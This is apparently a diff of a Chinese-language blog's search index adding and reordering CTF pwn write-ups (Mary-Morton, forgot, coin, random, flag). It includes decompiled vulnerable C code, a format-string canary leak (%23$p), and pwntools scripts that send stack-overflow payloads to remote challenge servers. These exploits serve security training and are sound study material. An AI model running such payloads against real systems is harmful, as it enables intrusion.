class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_4009DA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Stack Bufferoverflow Bug &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. Format String Bug &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;3. Exit the battle &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 格式化字符串漏洞</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_4008EB</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x7F</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 缓冲区溢出漏洞</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_400960</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;-&gt; %s\n&quot;</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输入v3=1，跳转到缓冲区溢出漏洞，如果不存在canary保护机制，则可以直接覆盖返回地址跳转到system函数。</p>
+<p>输入v3=2，跳转到格式化字符串漏洞，可以打印出栈上Canary，之后利用缓冲区溢出覆盖即可。</p>
+<p>输入v3=3，退出程序</p>
+<h3 id="绕过Canary机制"><a href="#绕过Canary机制" class="headerlink" title="绕过Canary机制"></a>绕过Canary机制</h3><p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/3.png" class></strong></p>
+<p>看一下流程图和汇编可以知道readsqword这个地方有canary保护，只有 rax 和fs：28h 两个值相等的时候  才能跳转到返回值，反之则调用stack_chk_fail。</p>
+<p>根据程序可以看出，v2应该就是canary的值，一开始，将_readfsqword(0x28u)的值给v2，后来又和v2做异或操作，只有v2与它还相等，程序返回0，否则返回不为零的数。</p>
+<h3 id="泄露v2（Canary）的值"><a href="#泄露v2（Canary）的值" class="headerlink" title="泄露v2（Canary）的值"></a>泄露v2（Canary）的值</h3><p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/6.png" class></strong></p>
+<p>程序中<a href="https://xz.aliyun.com/t/7398">格式化字符串漏洞</a>为</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x7F</span>uLL);  </span><br><span class="line"><span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br></pre></td></tr></table></figure>
+
+<p>程序将输入的<code>AAAA</code>存入buf中，之后格式化字符串打印出了其对应的ASCII码，因此可以计算出格式化字符串中<code>&amp;buf</code>的偏移量，即<code>&amp;buf</code>在第6个参数的位置。</p>
+<p>根据IDA的注释，我们知道buf在<code>rbp-90h</code>，v2在<code>rbp-8h</code>，canary与我们输入参数的偏移为<code>0x90 - 0x8 = 0x88</code>，然后八个字节为一组，<code>0x88 / 8 = 17</code>，因此Canary即v2在格式化字符串的第<code>17 + 6 = 23</code>参数的位置。</p>
+<blockquote>
+<p>基本的格式化字符串参数</p>
+<p>%c：输出字符，配上%n可用于向指定地址写数据。</p>
+<p>%d：输出十进制整数，配上%n可用于向指定地址写数据。</p>
+<p>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</p>
+<p>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</p>
+<p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p>
+<p>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%​$hn或%$hhn来适时调整。</p>
+<p>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</p>
+</blockquote>
+<p>注意%p、%x会直接打印栈上存储的值，而%s会打印栈上存储值所指向地址的值。</p>
+<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><p>payload的构造：覆盖返回地址，需要0x90-0x8=0x88覆盖局部变量，然后放上canary的值，在填充8个“a”覆盖ebp（64位程序），最后加上system的返回地址。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">49747</span>)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(<span class="string">&#x27;3. Exit the battle&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p.sendline(<span class="string">&#x27;%23$p&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = int(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">print(canary)</span><br><span class="line"> </span><br><span class="line">flag_addr = <span class="number">0x4008da</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(canary) + <span class="string">b&#x27;deafbeef&#x27;</span> + p64(flag_addr)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(<span class="string">&#x27;3. Exit the battle&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/5.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>AD_World</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+        <tag>Stack</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>forgot</title>
+    <url>/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/0.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/6.png" class></strong></p>
+<h3 id="检查文件开启的保护措施"><a href="#检查文件开启的保护措施" class="headerlink" title="检查文件开启的保护措施"></a>检查文件开启的保护措施</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/1.png" class></strong></p>
+<h3 id="用IDA32打开"><a href="#用IDA32打开" class="headerlink" title="用IDA32打开"></a>用IDA32打开</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/2.png" class></strong></p>
+<p>**__isoc99_scanf()**函数存在栈溢出漏洞，不会检查输入的字符串的长度，第二个参数表明写入地址为v2的地址，因此可以利用从v2地址开始写入内容覆盖控制函数执行流。</p>
+<h3 id="shift-F12查看字符串"><a href="#shift-F12查看字符串" class="headerlink" title="shift+F12查看字符串"></a>shift+F12查看字符串</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/3.png" class></strong></p>
+<p>找到其调用函数的位置</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/4.png" class></strong></p>
+<p>查看sub_80486CC函数所在地址（这里函数名称就对应其地址）</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/5.png" class></strong></p>
+<p>其函数所在地址0x080486CC，注意这里调用system函数需要传递<strong>cat flag</strong>参数，如果跳转地址直接为system函数的地址，则无法传递相应的参数。</p>
+<h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>利用栈溢出漏洞，输入v2，将v3-v12任意一个函数的地址修改为sub_80486CC的地址，之后让控制函数执行调用即可。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/7.png" class></strong></p>
+<p>v2是一个32字节的char数组，v2基地址为ebp-0x74，v3基地址为0x54，相差0x74-0x54=0x20=32byte，正好是32字节的char数组的空间大小。因此，这里选择覆盖v3的地址，原因在于v3在栈中紧贴存在栈溢出漏洞的变量，对程序流程造成的未知影响的可能性最小。之后只需要保证函数结尾调用v3，则需要保证- -v14等于0，即让v14等于1。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/8.png" class></strong></p>
+<p>即使得sub_8048702判断条件不成立，直接跳出循环，使得v14的值保持不变，仍为刚开始的1。查看该函数执行的逻辑。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/9.png" class></strong></p>
+<p>查看其ASCII码对应的字符为：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/10.png" class></strong></p>
+<p>若要使得该函数的判断条件不成立，则不能输入字符‘a’-‘z’，’0‘-’9‘，’+‘ ，’-‘，’_’</p>
+<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">52435</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;xiaohong&#x27;</span>)</span><br><span class="line">cat_flag_addr = <span class="number">0x80486CC</span></span><br><span class="line">payload = <span class="string">&#x27;/&#x27;</span>*(<span class="number">0x74</span><span class="number">-0x54</span>)+ p32(cat_flag_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/11.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>AD_World</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+        <tag>Stack</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>blackjack</title>
     <url>/xiaohong404.github.io/2020/10/19/PWN/Pwnable_kr/blackjack/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/19/PWN/Pwnable_kr/blackjack/0.png" class></strong></p>
@@ -422,6 +516,30 @@
       </tags>
   </entry>
   <entry>
+    <title>coin</title>
+    <url>/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/coin/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/coin/0.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/coin/3.png" class></strong></p>
+<h3 id="使用netcat连接上远程的服务器"><a href="#使用netcat连接上远程的服务器" class="headerlink" title="使用netcat连接上远程的服务器"></a>使用netcat连接上远程的服务器</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/coin/1.png" class></strong></p>
+<p>题目是一个游戏，大致意思是，一堆硬币，有一个假币，重量为9，而其他为10，要通过给定的C次机会内找到假币。一共要在30s内找到100个假币，也就是完成100次游戏，最终会给出flag。</p>
+<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>简单的二分法，但这里不能从本地直接连远程服务器，这样会超时，需要通过之前的连接登录远程服务器，之后在服务器上编写脚本运行，下面的代码即可成功运行：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">9007</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">	N, C = re.findall(<span class="string">&quot;N=(\d+) C=(\d+)&quot;</span>, p.recv())[<span class="number">0</span>]</span><br><span class="line">	N = int(N)</span><br><span class="line">	C = int(C)</span><br><span class="line">	print(N, C)</span><br><span class="line"></span><br><span class="line">	start, end = <span class="number">0</span>, N<span class="number">-1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> start &lt;= end <span class="keyword">and</span> C &gt; <span class="number">0</span>:</span><br><span class="line">		mid = (start + end) // <span class="number">2</span></span><br><span class="line">		x = <span class="string">&quot; &quot;</span>.join([str(j) <span class="keyword">for</span> j <span class="keyword">in</span> range(start, mid+<span class="number">1</span>)])	<span class="comment"># build range list</span></span><br><span class="line">		p.sendline(x)</span><br><span class="line">		</span><br><span class="line">		res = int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line">		<span class="keyword">if</span> res % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">			start = mid+<span class="number">1</span>	<span class="comment"># through first half</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			end = mid<span class="number">-1</span>		<span class="comment"># through second half</span></span><br><span class="line">		C -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> C &gt; <span class="number">0</span>:	<span class="comment"># use all the tries</span></span><br><span class="line">		p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">		p.recv(<span class="number">1024</span>)</span><br><span class="line">		C -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	p.sendline(str(start))	<span class="comment"># final answer</span></span><br><span class="line">	print(p.recv())</span><br><span class="line"></span><br><span class="line">print(p.recv())</span><br></pre></td></tr></table></figure>
+
+<p>注意这里有个细节是需要先进入服务器的/tmp文件夹下，之后自己再主动建立一个新的文件夹，否则会没有权限访问python的库，一直提示未定义的错误。之后在这个新的文件夹下建立一个python文件，可以随便取个名字，这里我就命名为coin.py。</p>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/coin/2.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>collision</title>
     <url>/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/collision/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/collision/1.png" class></strong></p>
@@ -457,52 +575,6 @@
       </tags>
   </entry>
   <entry>
-    <title>flag</title>
-    <url>/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/flag/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/flag/1.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/flag/2.png" class></strong></p>
-<h3 id="checksec查看文件属性"><a href="#checksec查看文件属性" class="headerlink" title="checksec查看文件属性"></a>checksec查看文件属性</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/flag/3.png" class></strong></p>
-<h3 id="windows下使用upx-d命令解压缩"><a href="#windows下使用upx-d命令解压缩" class="headerlink" title="windows下使用upx -d命令解压缩"></a>windows下使用upx -d命令解压缩</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/flag/4.png" class></strong></p>
-<h3 id="IDA64打开解压缩的文件"><a href="#IDA64打开解压缩的文件" class="headerlink" title="IDA64打开解压缩的文件"></a>IDA64打开解压缩的文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/flag/5.png" class></strong></p>
-<p>将flag的值存放到dest中，直接查看flag即可</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/flag/6.png" class></strong></p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Pwnable.kr</category>
-        <category>Toddler&#39;s Bottle</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>coin</title>
-    <url>/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/coin/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/coin/0.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/coin/3.png" class></strong></p>
-<h3 id="使用netcat连接上远程的服务器"><a href="#使用netcat连接上远程的服务器" class="headerlink" title="使用netcat连接上远程的服务器"></a>使用netcat连接上远程的服务器</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/coin/1.png" class></strong></p>
-<p>题目是一个游戏，大致意思是，一堆硬币，有一个假币，重量为9，而其他为10，要通过给定的C次机会内找到假币。一共要在30s内找到100个假币，也就是完成100次游戏，最终会给出flag。</p>
-<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>简单的二分法，但这里不能从本地直接连远程服务器，这样会超时，需要通过之前的连接登录远程服务器，之后在服务器上编写脚本运行，下面的代码即可成功运行：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">9007</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">	N, C = re.findall(<span class="string">&quot;N=(\d+) C=(\d+)&quot;</span>, p.recv())[<span class="number">0</span>]</span><br><span class="line">	N = int(N)</span><br><span class="line">	C = int(C)</span><br><span class="line">	print(N, C)</span><br><span class="line"></span><br><span class="line">	start, end = <span class="number">0</span>, N<span class="number">-1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> start &lt;= end <span class="keyword">and</span> C &gt; <span class="number">0</span>:</span><br><span class="line">		mid = (start + end) // <span class="number">2</span></span><br><span class="line">		x = <span class="string">&quot; &quot;</span>.join([str(j) <span class="keyword">for</span> j <span class="keyword">in</span> range(start, mid+<span class="number">1</span>)])	<span class="comment"># build range list</span></span><br><span class="line">		p.sendline(x)</span><br><span class="line">		</span><br><span class="line">		res = int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line">		<span class="keyword">if</span> res % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">			start = mid+<span class="number">1</span>	<span class="comment"># through first half</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			end = mid<span class="number">-1</span>		<span class="comment"># through second half</span></span><br><span class="line">		C -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> C &gt; <span class="number">0</span>:	<span class="comment"># use all the tries</span></span><br><span class="line">		p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">		p.recv(<span class="number">1024</span>)</span><br><span class="line">		C -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	p.sendline(str(start))	<span class="comment"># final answer</span></span><br><span class="line">	print(p.recv())</span><br><span class="line"></span><br><span class="line">print(p.recv())</span><br></pre></td></tr></table></figure>
-
-<p>注意这里有个细节是需要先进入服务器的/tmp文件夹下，之后自己再主动建立一个新的文件夹，否则会没有权限访问python的库，一直提示未定义的错误。之后在这个新的文件夹下建立一个python文件，可以随便取个名字，这里我就命名为coin.py。</p>
-<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/coin/2.png" class></strong></p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Pwnable.kr</category>
-        <category>Toddler&#39;s Bottle</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>fd</title>
     <url>/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/fd/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/fd/1.png" class></strong></p>
@@ -527,6 +599,28 @@
 <p>注意这里参数需要转为10进制   $0x1234_{16} = 4660_{10}$</p>
 <figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">flag: mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure>
 
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>flag</title>
+    <url>/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/flag/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/flag/1.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/flag/2.png" class></strong></p>
+<h3 id="checksec查看文件属性"><a href="#checksec查看文件属性" class="headerlink" title="checksec查看文件属性"></a>checksec查看文件属性</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/flag/3.png" class></strong></p>
+<h3 id="windows下使用upx-d命令解压缩"><a href="#windows下使用upx-d命令解压缩" class="headerlink" title="windows下使用upx -d命令解压缩"></a>windows下使用upx -d命令解压缩</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/flag/4.png" class></strong></p>
+<h3 id="IDA64打开解压缩的文件"><a href="#IDA64打开解压缩的文件" class="headerlink" title="IDA64打开解压缩的文件"></a>IDA64打开解压缩的文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/flag/5.png" class></strong></p>
+<p>将flag的值存放到dest中，直接查看flag即可</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/flag/6.png" class></strong></p>
 ]]></content>
       <categories>
         <category>PWN</category>
@@ -671,6 +765,33 @@
       </tags>
   </entry>
   <entry>
+    <title>random</title>
+    <url>/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/random/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/random/1.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/random/2.png" class></strong></p>
+<h3 id="查看random-c源代码"><a href="#查看random-c源代码" class="headerlink" title="查看random.c源代码"></a>查看random.c源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/random/3.png" class></strong></p>
+<p>函数的整个执行流程是rand（）产生的随机值和输入的密钥进行异或，若其结果等于$0xdeadbeef$，则可以执行system函数，拿到flag。</p>
+<h3 id="rand（）函数"><a href="#rand（）函数" class="headerlink" title="rand（）函数"></a>rand（）函数</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/random/4.png" class></strong></p>
+<p>由此可见，如果不重新生成种子（一般情况下，默认生成种子为1），则每次产生的随机数将会是一个固定值，那么接下来的任务就是确定这个固定值。</p>
+<h3 id="查看随机数"><a href="#查看随机数" class="headerlink" title="查看随机数"></a>查看随机数</h3><h4 id="disassemble-r-main-查看汇编代码"><a href="#disassemble-r-main-查看汇编代码" class="headerlink" title="$disassemble /r \ main$查看汇编代码"></a>$disassemble /r \ main$查看汇编代码</h4><p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/random/5.png" class></strong></p>
+<h4 id="在cmp处下断点"><a href="#在cmp处下断点" class="headerlink" title="在cmp处下断点"></a>在cmp处下断点</h4><p>汇编代码中，在进行cmp之前先进行了一次异或运算，显然这是将用户输入的key和生成的随机数进行异或，由此可以判断随机数的位置为$rbp-4$（先压入栈中），因此使用$x/10x \ $rbp-4$查看内存的值即可。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/random/6.png" class></strong></p>
+<p>所以生成的随机数为0x6b8b4567，可多次运行程序查看其值是否发生变化，这里不做演示。</p>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p>求出$0x6b8b4567\oplus 0xdeadbeef$的值输入即可</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/random/7.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>shellshock</title>
     <url>/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/shellshock/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/shellshock/0.png" class></strong></p>
@@ -697,33 +818,6 @@
 <p>关于shellshock漏洞相关知识可参考：</p>
 <p>1、<a href="https://www.baidu.com/link?url=3yWq37n7Y_LHRUa2L-iudGGqqgT-6s4gKmaU0_hOQBDFSacVZ_bxZqpA999gplxb_gOwXfn9XSE9mE53bYkDBK&wd=&eqid=e40eff4200053949000000035aa32eda">关于<em>ShellShock</em>漏洞的利用过程和原理解析 - CSDN博客</a></p>
 <p>2、<a href="http://www.freebuf.com/articles/system/45390.html">破壳（ShellShock）漏洞样本分析报告</a></p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Pwnable.kr</category>
-        <category>Toddler&#39;s Bottle</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>random</title>
-    <url>/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/random/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/random/1.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/random/2.png" class></strong></p>
-<h3 id="查看random-c源代码"><a href="#查看random-c源代码" class="headerlink" title="查看random.c源代码"></a>查看random.c源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/random/3.png" class></strong></p>
-<p>函数的整个执行流程是rand（）产生的随机值和输入的密钥进行异或，若其结果等于$0xdeadbeef$，则可以执行system函数，拿到flag。</p>
-<h3 id="rand（）函数"><a href="#rand（）函数" class="headerlink" title="rand（）函数"></a>rand（）函数</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/random/4.png" class></strong></p>
-<p>由此可见，如果不重新生成种子（一般情况下，默认生成种子为1），则每次产生的随机数将会是一个固定值，那么接下来的任务就是确定这个固定值。</p>
-<h3 id="查看随机数"><a href="#查看随机数" class="headerlink" title="查看随机数"></a>查看随机数</h3><h4 id="disassemble-r-main-查看汇编代码"><a href="#disassemble-r-main-查看汇编代码" class="headerlink" title="$disassemble /r \ main$查看汇编代码"></a>$disassemble /r \ main$查看汇编代码</h4><p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/random/5.png" class></strong></p>
